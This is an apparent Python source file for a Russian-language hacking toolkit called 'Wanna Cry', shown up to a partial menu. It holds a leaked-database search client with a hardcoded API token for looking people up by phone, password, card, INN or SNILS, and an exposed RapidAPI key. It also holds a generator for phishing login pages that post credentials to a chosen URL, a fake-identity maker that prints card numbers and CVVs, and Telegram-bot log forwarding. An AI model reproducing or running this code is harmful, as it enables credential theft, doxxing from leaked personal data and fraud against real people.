from pystyle import Center
import fishingtelegram
import logging
import requests
import iplogger
import honeypot
from faker import Faker
import pywhatkit as kit
from art import *
import ssl
import socket
from datetime import datetime, timezone
from pystyle import Colors, Colorate, Write
import http.client
from googletrans import Translator
import generatorTrollenga
from banword import convert_to_m33t
import time
import csv
from bs4 import BeautifulSoup
import json
import defusedxml.ElementTree as ET

last_search_time = 0


def api_search(req):
    global last_search_time
    try:
        Write.Print(f"\n[INFO] Запрос: {req}", current_theme, interval=0.0001)
        current_time = time.time()
        if current_time - last_search_time < 60:
            Write.Print("\n[!] Подождите минуту перед следующим запросом\n", current_theme, interval=0.0001)
            return

        url = "https://server.leakosint.com/"
        headers = {
            "Content-Type": "application/json"
        }
        payload = {
            "token": "6607575831:mrjoz662",
            "request": req,
            "limit": 100,
            "lang": "ru"
        }

        response = requests.post(url, json=payload, headers=headers)

        if response.status_code != 200:
            Write.Print(f"\n[ERROR] Ошибка HTTP {response.status_code}: {response.reason}\n", current_theme,
                        interval=0.0001)
            return
        data = response.json().get('List', {})

        if not data:
            Write.Print("\n[SORRY] Ничего не найдено\n", current_theme, interval=0.0001)
            return

        for database, info in data.items():
            if "No results found" in database:
                Write.Print("\n[SORRY] Ничего не найдено\n", current_theme, interval=0.0001)
                break

            Write.Print("\n[DB] База данных -!> ", current_theme, interval=0.0001)
            Write.Print(database, Colors.white, interval=0.0001)
            Write.Print("\n\n[#] Описание -!> ", current_theme, interval=0.0001)
            Write.Print(f"{info['InfoLeak']}\n", current_theme, interval=0.0001)

            for record in info['Data']:
                for key, value in record.items():
                    Write.Print(f"\n[S] {key} -!> ", current_theme, interval=0.0001)
                    Write.Print(value, Colors.white, interval=0.0001)
            print()

        last_search_time = current_time
    except Exception as e:
        Write.Print(f"\n[ERROR] Произошла ошибка: {e}\n", current_theme, interval=0.0001)
def logo():
    Write.Print(f"""
    
     ▄█     █▄     ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████       ▄████████    ▄████████ ▄██   ▄         
    ███     ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███      ███    ███   ███    ███ ███   ██▄        
    ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▀    ███    ███ ███▄▄▄███        
    ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███         ▄███▄▄▄▄██▀ ▀▀▀▀▀▀███       
    ███     ███ ▀███████████ ███   ███ ███   ███ ▀███████████      ███        ▀▀███▀▀▀▀▀   ▄██   ███       
    ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▄  ▀███████████ ███   ███       
    ███ ▄█▄ ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    ███   ███    ███ ███   ███        
     ▀███▀███▀    ███    █▀   ▀█   █▀   ▀█   █▀    ███    █▀       ████████▀    ███    ███  ▀█████▀         
                                                                                ███    ███   

    ████████████████████████████████████████████████████████████████████████████████████████████████

                    """, current_theme, interval=0.000005)

def parsing_html_title():
    logo()
    Write.Print("\n[INFO] Парсинг заголовка HTML...", current_theme, interval=0.0001)

    url = input("Введите URL для парсинга: ")

    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.RequestException as e:
        Write.Print(f"[ERROR] Не удалось получить веб-страницу. Ошибка: {e}", current_theme, interval=0.0001)
        return

    html_content = response.text
    soup = BeautifulSoup(html_content, 'html.parser')

    # Извлечение заголовка страницы
    title_tag = soup.find('title')
    if title_tag:
        Write.Print(f"\n[INFO] Заголовок страницы: {title_tag.text}", current_theme, interval=0.0001)
    else:
        Write.Print("[INFO] Заголовок страницы не найден.", current_theme, interval=0.0001)


def parsing_html_paraphrases():
    logo()
    Write.Print("\n[INFO] Парсинг параграфов HTML...", current_theme, interval=0.0001)

    url = input("Введите URL для парсинга: ")

    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.RequestException as e:
        Write.Print(f"[ERROR] Не удалось получить веб-страницу. Ошибка: {e}", current_theme, interval=0.0001)
        return

    html_content = response.text
    soup = BeautifulSoup(html_content, 'html.parser')

    # Извлечение всех параграфов
    paragraphs = soup.find_all('p')
    if paragraphs:
        Write.Print("\n[INFO] Найденные параграфы:", current_theme, interval=0.0001)
        for para in paragraphs:
            Write.Print(f"\n{para.text}", current_theme, interval=0.0001)
    else:
        Write.Print("[INFO] Параграфы не найдены.", current_theme, interval=0.0001)


def parse_csv():
    logo()
    file_path = input("[?] Введите путь к CSV файлу: ")
    Write.Print("\n[INFO] Parsing CSV...", current_theme, interval=0.0001)

    try:
        with open(file_path, mode='r', newline='', encoding='utf-8') as csv_file:
            csv_reader = csv.reader(csv_file)
            headers = next(csv_reader)

            Write.Print(f"[INFO] Headers: {headers}", current_theme, interval=0.0001)

            for row in csv_reader:
                Write.Print(f"[INFO] Row: {row}", current_theme, interval=0.0001)

    except FileNotFoundError:
        Write.Print("[ERROR] File not found.", current_theme, interval=0.0001)
    except csv.Error as e:
        Write.Print(f"[ERROR] CSV error: {e}", current_theme, interval=0.0001)
    except Exception as e:
        Write.Print(f"[ERROR] An unexpected error occurred: {e}", current_theme, interval=0.0001)

def parse_txt():
    logo()
    file_path = input("Введите путь к TXT файлу: ")
    Write.Print("\n[INFO] Parsing TXT...", current_theme, interval=0.0001)

    try:
        with open(file_path, mode='r', encoding='utf-8') as txt_file:
            lines = txt_file.readlines()

            Write.Print(f"Number of lines: {len(lines)}", current_theme, interval=0.0001)

            for line in lines:
                Write.Print(f"Line: {line.strip()}", current_theme, interval=0.0001)

    except FileNotFoundError:
        Write.Print("[ERROR] File not found.", current_theme, interval=0.0001)
    except Exception as e:
        Write.Print(f"[ERROR] An unexpected error occurred: {e}", current_theme, interval=0.0001)

def parse_html_links():
    logo()
    file_path = input("Введите путь к HTML файлу: ")
    Write.Print("\n[INFO] Parsing HTML links...", current_theme, interval=0.0001)

    try:
        with open(file_path, mode='r', encoding='utf-8') as html_file:
            soup = BeautifulSoup(html_file, 'html.parser')
            links = soup.find_all('a')  # Находим все теги <a>

            if links:
                Write.Print(f"Found {len(links)} links:", current_theme, interval=0.0001)
                for link in links:
                    href = link.get('href')
                    Write.Print(f"Link: {href}", current_theme, interval=0.0001)
            else:
                Write.Print("No links found.", current_theme, interval=0.0001)

    except FileNotFoundError:
        Write.Print("[ERROR] File not found.", current_theme, interval=0.0001)
    except Exception as e:
        Write.Print(f"[ERROR] An unexpected error occurred: {e}", current_theme, interval=0.0001)


def parse_html_img():
    logo()
    file_path = input("Введите путь к HTML файлу: ")
    Write.Print("\n[INFO] Parsing HTML IMG...", current_theme, interval=0.0001)

    try:
        with open(file_path, mode='r', encoding='utf-8') as html_file:
            soup = BeautifulSoup(html_file, 'html.parser')
            images = soup.find_all('img')  # Находим все теги <img>

            if images:
                Write.Print(f"Found {len(images)} images:", current_theme, interval=0.0001)
                for img in images:
                    src = img.get('src')
                    alt = img.get('alt', 'No alt attribute')
                    Write.Print(f"Image src: {src}, alt: {alt}", current_theme, interval=0.0001)
            else:
                Write.Print("No images found.", current_theme, interval=0.0001)

    except FileNotFoundError:
        Write.Print("[ERROR] File not found.", current_theme, interval=0.0001)
    except Exception as e:
        Write.Print(f"[ERROR] An unexpected error occurred: {e}", current_theme, interval=0.0001)

def parse_html_elements():
    logo()
    Write.Print("\n[INFO] Парсинг HTML элементов...", current_theme, interval=0.0001)

    url = input("Введите URL для парсинга: ")  # Ввод URL от пользователя
    try:
        response = requests.get(url)
        response.raise_for_status()  # Проверка на ошибки HTTP
    except requests.RequestException as e:
        Write.Print(f"[ERROR] Не удалось получить веб-страницу. Ошибка: {e}", current_theme, interval=0.0001)
        return

    html_content = response.text
    soup = BeautifulSoup(html_content, 'html.parser')

    # Пример парсинга всех ссылок на странице
    links = soup.find_all('a')
    Write.Print("\n[INFO] Найденные ссылки:", current_theme, interval=0.0001)
    for link in links:
        Write.Print(f"Ссылка: {link.get('href')}", current_theme, interval=0.0001)

    # Пример парсинга всех заголовков на странице
    headers = soup.find_all(['h1', 'h2', 'h3', 'h4', 'h5', 'h6'])
    Write.Print("\n[INFO] Найденные заголовки:", current_theme, interval=0.0001)
    for header in headers:
        Write.Print(f"Заголовок: {header.text}", current_theme, interval=0.0001)


def parse_json_keys():
    logo()
    Write.Print("\n[INFO] Парсинг JSON ключей...", current_theme, interval=0.0001)

    json_data = input("Введите JSON данные: ")  # Ввод JSON данных от пользователя
    try:
        data = json.loads(json_data)  # Преобразование строки в объект JSON
    except json.JSONDecodeError as e:
        Write.Print(f"[ERROR] Ошибка разбора JSON: {e}", current_theme, interval=0.0001)
        return

    def extract_keys(obj, parent_key=''):
        keys = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                full_key = f"{parent_key}.{k}" if parent_key else k
                keys.append(full_key)
                keys.extend(extract_keys(v, full_key))
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                keys.extend(extract_keys(item, f"{parent_key}[{i}]"))
        return keys

    keys = extract_keys(data)

    Write.Print("\n[INFO] Найденные ключи JSON:", current_theme, interval=0.0001)
    for key in keys:
        Write.Print(f"Ключ: {key}", current_theme, interval=0.0001)

def parse_logs():
    logo()
    Write.Print("\n[INFO] Парсинг логов...", current_theme, interval=0.0001)

    log_file_path = input("Введите путь к файлу логов: ")  # Ввод пути к файлу логов от пользователя

    try:
        with open(log_file_path, 'r') as file:
            log_lines = file.readlines()
    except FileNotFoundError:
        Write.Print(f"[ERROR] Файл не найден: {log_file_path}", current_theme, interval=0.0001)
        return
    except IOError as e:
        Write.Print(f"[ERROR] Ошибка чтения файла: {e}", current_theme, interval=0.0001)
        return

    # Пример простого парсинга: вывод всех строк из файла
    Write.Print("\n[INFO] Содержимое лог-файла:", current_theme, interval=0.0001)
    for line in log_lines:
        Write.Print(line.strip(), current_theme, interval=0.0001)


def parse_html():
    url = input("Введите URL для парсинга: ")

    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.RequestException as e:
        Write.Print(f"[ERROR] Не удалось получить веб-страницу. Ошибка: {e}", current_theme, interval=0.0001)
        return

    html_content = response.text
    soup = BeautifulSoup(html_content, 'html.parser')

    Write.Print("\n[INFO] Найденные ссылки:", current_theme, interval=0.0001)
    links = soup.find_all('a')
    for link in links:
        href = link.get('href')
        if href:
            Write.Print(f"Ссылка: {href}", current_theme, interval=0.0001)

    Write.Print("\n[INFO] Найденные заголовки:", current_theme, interval=0.0001)
    headers = soup.find_all(['h1', 'h2', 'h3', 'h4', 'h5', 'h6'])
    for header in headers:
        Write.Print(f"Заголовок: {header.text}", current_theme, interval=0.0001)

def parse_xml():
    logo()
    Write.Print("\n[INFO] Парсинг XML...", current_theme, interval=0.0001)

    xml_file_path = input("Введите путь к XML файлу: ")

    try:
        tree = ET.parse(xml_file_path)
        root = tree.getroot()
    except ET.ParseError as e:
        Write.Print(f"[ERROR] Ошибка разбора XML: {e}", current_theme, interval=0.0001)
        return
    except FileNotFoundError:
        Write.Print(f"[ERROR] Файл не найден: {xml_file_path}", current_theme, interval=0.0001)
        return
    except IOError as e:
        Write.Print(f"[ERROR] Ошибка чтения файла: {e}", current_theme, interval=0.0001)
        return

    Write.Print("\n[INFO] Содержимое XML файла:", current_theme, interval=0.0001)

    def recursive_parse(element, indent=""):
        for child in element:
            attributes = ", ".join([f"{k}={v}" for k, v in child.attrib.items()])
            attr_str = f", Атрибуты: {attributes}" if attributes else ""
            Write.Print(f"{indent}Тег: {child.tag}, Значение: {child.text}{attr_str}", current_theme, interval=0.0001)
            recursive_parse(child, indent + "  ")

    recursive_parse(root)

    recursive_parse(root)

def parse_json():
    logo()
    Write.Print("\n[INFO] Парсинг JSON...", current_theme, interval=0.0001)

    json_data = input("Введите JSON данные: ")

    try:
        data = json.loads(json_data)
    except json.JSONDecodeError as e:
        Write.Print(f"[ERROR] Ошибка разбора JSON: {e}", current_theme, interval=0.0001)
        return

    def print_json(obj, indent=""):
        if isinstance(obj, dict):
            for key, value in obj.items():
                Write.Print(f"{indent}Ключ: {key}", current_theme, interval=0.0001)
                print_json(value, indent + "  ")
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                Write.Print(f"{indent}Элемент [{i}]", current_theme, interval=0.0001)
                print_json(item, indent + "  ")
        else:
            Write.Print(f"{indent}Значение: {obj}", current_theme, interval=0.0001)

    Write.Print("\n[INFO] Содержимое JSON данных:", current_theme, interval=0.0001)
    print_json(data)

def main_project_function():
    generatorTrollenga.main()

def search_anime(query):
    conn = http.client.HTTPSConnection("anime-db.p.rapidapi.com")
    headers = {
        'x-rapidapi-key': "7046a2f29fmsh5d5190d6e5c9dd7p1cf8dfjsnd9de4b04b2b1",
        'x-rapidapi-host': "anime-db.p.rapidapi.com"
    }

    url = f"/anime?page=1&size=10&search={query}&genres=Fantasy%2CDrama&sortBy=ranking&sortOrder=asc"

    translator = Translator()

    conn.request("GET", url, headers=headers)
    res = conn.getresponse()
    data = res.read()
    if res.status == 200:
        anime_info = json.loads(data.decode("utf-8"))
        results = anime_info.get('data', [])
        if results:
            for anime in results:
                title = anime.get('title', 'Без названия')
                synopsis = anime.get('synopsis', 'Нет описания')
                translated_synopsis = translator.translate(synopsis, src='en', dest='ru').text
                Write.Print(f"""
 ▄█     █▄     ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████       ▄████████    ▄████████ ▄██   ▄         
███     ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███      ███    ███   ███    ███ ███   ██▄        
███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▀    ███    ███ ███▄▄▄███        
███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███         ▄███▄▄▄▄██▀ ▀▀▀▀▀▀███       
███     ███ ▀███████████ ███   ███ ███   ███ ▀███████████      ███        ▀▀███▀▀▀▀▀   ▄██   ███       
███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▄  ▀███████████ ███   ███       
███ ▄█▄ ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    ███   ███    ███ ███   ███        
 ▀███▀███▀    ███    █▀   ▀█   █▀   ▀█   █▀    ███    █▀       ████████▀    ███    ███  ▀█████▀         
                                                                            ███    ███   

████████████████████████████████████████████████████████████████████████████████████████████████

                                      REQUEST: {query}                                       
                                    METHOD: ANIME SEARCH          

████████████████████████████████████████████████████████████████████████████████████████████████
Название: {title}
Описание: {translated_synopsis}\n
                """, current_theme, interval=0.000005)
        else:
            Write.Print("Нет результатов по вашему запросу." , Colors.red_to_white , interval=0.000005)
    else:
        Write.Print(f"Ошибка: {res.status}", Colors.red_to_white , interval=0.000005)
        Write.Print(f"Ответ: {data.decode('utf-8')}", Colors.red_to_white , interval=0.000005)

def get_cert_info(hostname):
    port = 443
    context = ssl.create_default_context()
    with socket.create_connection((hostname, port)) as conn:
        with context.wrap_socket(conn, server_hostname=hostname) as sock:
            cert = sock.getpeercert()

    issuer = dict(x[0] for x in cert['issuer'])
    subject = dict(x[0] for x in cert['subject'])
    valid_from = datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y GMT').replace(tzinfo=timezone.utc)
    valid_to = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y GMT').replace(tzinfo=timezone.utc)
    is_valid = valid_to > datetime.now(timezone.utc) > valid_from

    date_format = '%Y-%m-%d %H:%M:%S %Z'

    Write.Print(f"""
 ▄█     █▄     ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████       ▄████████    ▄████████ ▄██   ▄         
███     ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███      ███    ███   ███    ███ ███   ██▄        
███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▀    ███    ███ ███▄▄▄███        
███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███         ▄███▄▄▄▄██▀ ▀▀▀▀▀▀███       
███     ███ ▀███████████ ███   ███ ███   ███ ▀███████████      ███        ▀▀███▀▀▀▀▀   ▄██   ███       
███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▄  ▀███████████ ███   ███       
███ ▄█▄ ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    ███   ███    ███ ███   ███        
 ▀███▀███▀    ███    █▀   ▀█   █▀   ▀█   █▀    ███    █▀       ████████▀    ███    ███  ▀█████▀         
                                                                            ███    ███   
                                                                                                           
████████████████████████████████████████████████████████████████████████████████████████████████

                                        REQUEST: {hostname}                                       
                                        METHOD: WHOIS            
                                                                         
████████████████████████████████████████████████████████████████████████████████████████████████

""", current_theme,interval=0.000005)
    Write.Print(f"            \nIssuer:", current_theme,interval=0.000005)
    for key, value in issuer.items():
        Write.Print(f"\n{key}: {value}", current_theme,interval=0.000005)

    Write.Print(f"            \nValid From: {valid_from.strftime(date_format)}", current_theme,interval=0.000005)
    Write.Print(f"            \nValid To: {valid_to.strftime(date_format)}", current_theme,interval=0.000005)
    Write.Print(f"            \nValid: {'True' if is_valid else 'False'}", current_theme,interval=0.000005)

    Write.Print(f"            \nDetails:", current_theme,interval=0.000005)
    Write.Print(f"            \nSubject:", current_theme,interval=0.000005)
    for key, value in subject.items():
        Write.Print(f"            \n{key}: {value}", current_theme,interval=0.000005)

    Write.Print(f"            \nSubject Alternative Name:", current_theme,interval=0.000005)
    for san in cert.get('subjectAltName', []):
        Write.Print(f"            \n{san[0]}: {san[1]}", current_theme,interval=0.000005)

    Write.Print(f"            \nInfo Access:", current_theme,interval=0.000005)
    for access_type, uri in cert.get('authority_info_access', []):
        Write.Print(f"            \n{access_type} - URI: {uri}", current_theme,interval=0.000005)

def generate_ascii_logo(text, font='block'):
    return text2art(text, font=font)

def save_logo_to_file(logo, filename="logo.txt"):
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(logo)

def mains():
    Write.Print("Меню:", current_theme,interval=0.000005)
    print("1. Сгенерировать ASCII логотип")
    print("2. Выбрать стиль логотипа и создать несколько логотипов")
    choice = int(input("Выберите опцию: "))
    if choice == 1:
        logo_name = input("Введите название для логотипа: ")
        ascii_logo = generate_ascii_logo(logo_name)
        Write.Print("Ваш ASCII логотип:\n", Colors.green, interval=0.01)
        Write.Print(ascii_logo, Colors.blue, interval=0.01)
        save_logo_to_file(ascii_logo)
        Write.Print("Логотип сохранен в logo.txt\n", Colors.green, interval=0.01)

    elif choice == 2:
        print("Доступные стили логотипов:")
        fonts = ["block", "banner", "big", "bubble", "doom", "isometric1", "isometric2", "isometric3", "isometric4", "lean", "mini", "script", "shadow", "slant", "smslant", "standard"]
        for i, font in enumerate(fonts):
            print(f"{i + 1}. {font}")
        font_choice = int(input("Выберите стиль логотипа: ")) - 1
        if 0 <= font_choice < len(fonts):
            selected_font = fonts[font_choice]
            quantity = int(input("Введите количество логотипов: "))
            for _ in range(quantity):
                logo_name = input("Введите название для логотипа: ")
                ascii_logo = generate_ascii_logo(logo_name, font=selected_font)
                Write.Print("Ваш ASCII логотип:\n", Colors.green, interval=0.01)
                Write.Print(ascii_logo, Colors.blue, interval=0.01)
                save_logo_to_file(ascii_logo, f"logo_{logo_name}.txt")
                Write.Print(f"Логотип сохранен в logo_{logo_name}.txt\n", Colors.green, interval=0.01)
        else:
            Write.Print("Некорректный выбор стиля.\n", Colors.red, interval=0.01)
    else:
        Write.Print("Некорректный выбор опции.\n", Colors.red, interval=0.01)


def search_by_htmlweb(phone: str):
    try:
        url = f"https://htmlweb.ru/geo/api.php?json&telcod={phone}"
        res = requests.get(url, timeout=10)
        data = res.json()

        if '0' in data:
            info = data['0']
            country = data.get("country", {}).get("name", "Не найдено")
            region = data.get("region", {}).get("name", "Не найдено")
            operator = info.get("oper", "Не найдено")
            telcod = info.get("telcod", "Не найдено")
            latitude = info.get("latitude", "Не найдено")
            longitude = info.get("longitude", "Не найдено")
            time_zone = info.get("time_zone", "Не найдено")
            tz = info.get("tz", "Не найдено")
            mobile = "Мобильный" if info.get("mobile", False) else "Стационарный"
            operator_brand = info.get("oper_brand", "Не найдено")
            def_range = info.get("def", "Не найдено")
            country_fullname = data.get("country", {}).get("fullname", "Не найдено")
            country_english = data.get("country", {}).get("english", "Не найдено")
            country_code3 = data.get("country", {}).get("country_code3", "Не найдено")
            country_iso = data.get("country", {}).get("iso", "Не найдено")
            country_telcod = data.get("country", {}).get("telcod", "Не найдено")
            country_location = data.get("country", {}).get("location", "Не найдено")
            country_capital = data.get("country", {}).get("capital", "Не найдено")
            country_mcc = data.get("country", {}).get("mcc", "Не найдено")
            country_lang = data.get("country", {}).get("lang", "Не найдено")
            country_langcod = data.get("country", {}).get("langcod", "Не найдено")
            region_id = data.get("region", {}).get("id", "Не найдено")
            region_okrug = data.get("region", {}).get("okrug", "Не найдено")
            region_autocod = data.get("region", {}).get("autocod", "Не найдено")
            region_capital = data.get("region", {}).get("capital", "Не найдено")
            region_english = data.get("region", {}).get("english", "Не найдено")
            region_iso = data.get("region", {}).get("iso", "Не найдено")

            Write.Print(f"""

                  ▄█     █▄     ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████       ▄████████    ▄████████ ▄██   ▄         
                 ███     ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███      ███    ███   ███    ███ ███   ██▄        
                 ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▀    ███    ███ ███▄▄▄███        
                 ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███         ▄███▄▄▄▄██▀ ▀▀▀▀▀▀███       
                 ███     ███ ▀███████████ ███   ███ ███   ███ ▀███████████      ███        ▀▀███▀▀▀▀▀   ▄██   ███       
                 ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▄  ▀███████████ ███   ███       
                 ███ ▄█▄ ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    ███   ███    ███ ███   ███        
                  ▀███▀███▀    ███    █▀   ▀█   █▀   ▀█   █▀    ███    █▀       ████████▀    ███    ███  ▀█████▀         
                                                                                             ███    ███   
                                                                                                           
            █████████████████████████████████████████████████████████████████████████████████████████████████████████████
            
                                                         REQUEST: {phone}                                       
                                                         METHOD: HTMLWEB            
                                                                                     
            █████████████████████████████████████████████████████████████████████████████████████████████████████████████
            
            Страна: {country}
            Полное название страны: {country_fullname}
            Название страны на английском: {country_english}
            Код страны (3 символа): {country_code3}
            ISO код страны: {country_iso}
            Телефонный код страны: {country_telcod}
            Локация страны: {country_location}
            Столица страны: {country_capital}
            MCC страны: {country_mcc}
            Язык страны: {country_lang}
            Код языка страны: {country_langcod}
            Регион: {region}
            ID региона: {region_id}
            Округ региона: {region_okrug}
            Автокод региона: {region_autocod}
            Столица региона: {region_capital}
            Название региона на английском: {region_english}
            ISO код региона: {region_iso}
            Оператор: {operator}
            Код оператора: {telcod}
            Широта: {latitude}
            Долгота: {longitude}
            Часовой пояс: {time_zone}
            Временная зона: {tz}
            Тип: {mobile}
            Бренд оператора: {operator_brand}
            Диапазон DEF: {def_range}                                                                             
            █████████████████████████████████████████████████████████████████████████████████████████████████████████████

""",current_theme,interval=0.0000000005)

        else:
            Write.Print("\nИнформация о номере не найдена." , Colors.red_to_white , interval=0.0000000005)

    except Exception as e:
        Write.Print('\nВ ходе сканирования произошла ошибка!' , Colors.red_to_white , interval=0.0000000005)
        print(str(e))


def image_to_ascii(image_path, output_file):
    try:
        kit.image_to_ascii_art(image_path, output_file)
        print(f"ASCII-арт успешно сохранен в {output_file}.txt")
    except Exception as e:
        print(f"Произошла ошибка: {e}")

def generate_fake_identity():
    fake = Faker('ru_RU')
    Write.Print(f"""
    ▄█     █▄     ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████       ▄████████    ▄████████ ▄██   ▄         
   ███     ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███      ███    ███   ███    ███ ███   ██▄        
   ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▀    ███    ███ ███▄▄▄███        
   ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███         ▄███▄▄▄▄██▀ ▀▀▀▀▀▀███       
   ███     ███ ▀███████████ ███   ███ ███   ███ ▀███████████      ███        ▀▀███▀▀▀▀▀   ▄██   ███       
   ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▄  ▀███████████ ███   ███       
   ███ ▄█▄ ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    ███   ███    ███ ███   ███        
    ▀███▀███▀    ███    █▀   ▀█   █▀   ▀█   █▀    ███    █▀       ████████▀    ███    ███  ▀█████▀         
                                                                               ███    ███   
                                                                                                           
███████████████████████████████████████████████████████████████████████████████████████████████████████

                                             REQUEST: FAKE INFO                                       
                                             METHOD: FAKER            
                                                                         
███████████████████████████████████████████████████████████████████████████████████████████████████████
""",current_theme ,interval=0.0005)
    identity = f"""
    Имя: {fake.first_name()}
    Фамилия: {fake.last_name()}
    Дата рождения: {fake.date_of_birth()}
    Профессия: {fake.job()}
    Адрес: {fake.address()}
    IPv4-адрес: {fake.ipv4()}
    Приватный IPv4: {fake.ipv4_private()}
    MAC-адрес: {fake.mac_address()}
    IPv6-адрес: {fake.ipv6()} 
    Электронная почта:    
    Email: {fake.email()}
    Пароль: {fake.password()}
    Номер телефона: {fake.phone_number()}
    Номер кредитной карты: {fake.credit_card_number()}
    Срок действия: {fake.credit_card_expire()}
    CVV: {fake.credit_card_security_code()}
    Номер паспорта: {fake.passport_number()}
    Дата выдачи паспорта: {fake.date()}
    Пол: {fake.random_element(elements=('М', 'Ж'))}
    Дата окончания действия паспорта: {fake.date()}
    Название компании: {fake.company()}
    Должность: {fake.job()}
    Учебное заведение: {fake.company()}   
    Специальность: {fake.job()}
    Дополнительно:
    Цвет глаз: {fake.color_name()}
    Номер водительского удостоверения: {fake.license_plate()}
    """
    return identity

def generate_phishing_site(site_name, login_url, output_file):
    html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{site_name}</title>
    <style>
        body {{ font-family: Arial, sans-serif; text-align: center; padding: 50px; }}
        .container {{ max-width: 300px; margin: 0 auto; border: 1px solid #ccc; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #333; }}
        label {{ display: block; margin-bottom: 10px; }}
        input[type="text"], input[type="password"] {{ width: 100%; padding: 10px; margin: 5px 0 20px 0; border: 1px solid #ddd; border-radius: 5px; }}
        input[type="submit"] {{ background-color: #28a745; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }}
        input[type="submit"]:hover {{ background-color: #218838; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to {site_name}</h1>
        <form action="{login_url}" method="post">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required><br>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required><br>
            <input type="submit" value="Login">
        </form>
    </div>
</body>
</html>
    """

    with open(output_file, "w") as file:
        file.write(html_content)

def setup_logging(log_file):
    logging.basicConfig(filename=log_file, level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s')

def send_telegram_message(message, bot_token, chat_id):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message
    }
    response = requests.post(url, data=payload)
    return response.json()

def log_message(message, theme, log_file='logs.txt', bot_token=None, chat_id=None):
    logging.info(f"[{theme}] {message}")
    if bot_token and chat_id:
        send_telegram_message(f"[{theme}] {message}", bot_token, chat_id)


menu_banner_1 = '''
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
    █                                                                                                                            █
    █               ▄█     █▄     ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████       ▄████████    ▄████████ ▄██   ▄                █
    █              ███     ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███      ███    ███   ███    ███ ███   ██▄              █
    █              ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▀    ███    ███ ███▄▄▄███              █
    █              ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███         ▄███▄▄▄▄██▀ ▀▀▀▀▀▀███              █
    █              ███     ███ ▀███████████ ███   ███ ███   ███ ▀███████████      ███        ▀▀███▀▀▀▀▀   ▄██   ███              █
    █              ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▄  ▀███████████ ███   ███              █
    █              ███ ▄█▄ ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    ███   ███    ███ ███   ███              █
    █               ▀███▀███▀    ███    █▀   ▀█   █▀   ▀█   █▀    ███    █▀       ████████▀    ███    ███  ▀█████▀               █
    █                                                                                          ███    ███                        █
    █                                                                                                                            █
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
    █                                                      VERSION: 1.7.0                                                        █ 
    █                                                     Change Theme:> T                                                       █                 
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
    █                                                     dev: @suidcider                                                        █ 
    █                                                Welcome To Menu Wanna Cry                                                   █ 
    █                                                    Studio: @thiasoft                                                       █ 
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
    █                                       █                                        █                                           █
    █   [1] Поиск по номеру (HTMLWEB)       █   [4] Поиск по Mанги                   █       [7] Поиск По ИНН                    █          
    █   [2] Поиск по ДОМЕНУ (WHOIS)         █   [5] Поиск По Hомеру                  █       [8] Поиск По СНИЛС                  █
    █   [3] Поиск по Aниме                  █   [6] Поиск По почте                   █       [9] Поиск По паролю                 █
    █                                       █                                        █                                           █ 
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
    █                                       █                                        █                                           █
    █   [10] Поиск По Telegram ID           █   [13] Поиск По FIO                    █       [16] Поиск По Domain                █          
    █   [11] Поиск по карте                 █   [14] Поиск По IP                     █       [17] Поиск По Company               █
